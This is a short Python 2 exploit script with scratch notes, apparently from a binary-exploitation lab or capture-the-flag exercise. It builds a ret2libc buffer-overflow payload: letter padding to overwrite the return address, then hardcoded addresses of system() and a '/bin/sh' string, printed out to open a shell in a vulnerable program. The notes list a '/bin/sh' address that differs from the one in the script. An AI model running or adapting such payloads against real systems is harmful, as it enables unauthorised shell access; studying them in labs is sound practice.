import struct
padding = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSS"
system = struct.pack("I", 0xb7e6b060)
return_after_system = "AAAA"
bin_sh = struct.pack("I", 0xb7f8cc58)
print padding + system + return_after_system + bin_sh



struct.pack("I", 0xb7e6b060)

bin sh addr = 0xbffff6f8

system addr = 0xb7e6b060

0xb7e6b060